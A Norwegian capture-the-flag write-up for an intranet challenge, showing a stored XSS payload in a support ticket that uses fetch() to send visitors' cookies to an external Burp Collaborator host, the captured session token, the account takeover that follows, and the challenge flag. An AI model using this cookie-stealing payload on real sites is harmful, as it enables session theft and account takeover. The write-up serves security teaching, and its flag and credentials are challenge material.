# Snikende Bacon - Del 1

Du er Jonas Kvam, nyansatt på baconlageret i Matkrim Baconenheten.
Du ble ansatt av Magnus Berg for å teste sikkerheten til intranettet deres.

Din e-post er:
> `jonas.kvam@matkrimbaconenheten.no`
Ditt passord er:
> `bacon-gutt-lager-119`

Noen ganger er det bare å krysse over til den andre siden for å finne det man leter etter.

Lykke til, Jonas! 🥓

[🔗 https://skatt-intranett.chals.io/](https://skatt-intranett.chals.io/)

# Writeup

Her bruker man en simpel XSS-sårbarhet for å stjele cookien til dem som leser support medlinger. For å motta data bruker jeg [Burp Collaberator](https://oastify.com/) som lar meg lage en unik URL som jeg kan se alle forespørsler til.

Oppretter så en sak med meldingen:

```html
<script>fetch('//0mneowrpubcevwgaag1cebriv910pqdf.oastify.com?' + document.cookie)</script>
```

Får tilbake følgende reqeust:

```
GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRvbW15LnJva3RAbWF0a3JpbWJhY29uZW5oZXRlbi5ubyIsImlhdCI6MTc3MzEzMjM1M30.O1WPHDjm4lIVtFIpbYGlmRBccUwc0YERK8KdiBWZXQs HTTP/1.1
Host: 0mneowrpubcevwgaag1cebriv910pqdf.oastify.com
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120.0.0.0 Safari/537.36
Accept: */*
Origin: http://www.matkrimbaconenheten.no:5000
Referer: http://www.matkrimbaconenheten.no:5000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

Ved å lime inn denne token så får vi logget inn som Tommy Røkt og får nå tilgang til filer. 

![Filer](filer.png)

I `k-disken-utkast.txt` ligger flagget og hint om neste oppgave.

# Flag

```
skatt{x55_g0t_y0ur_c00k13s}
```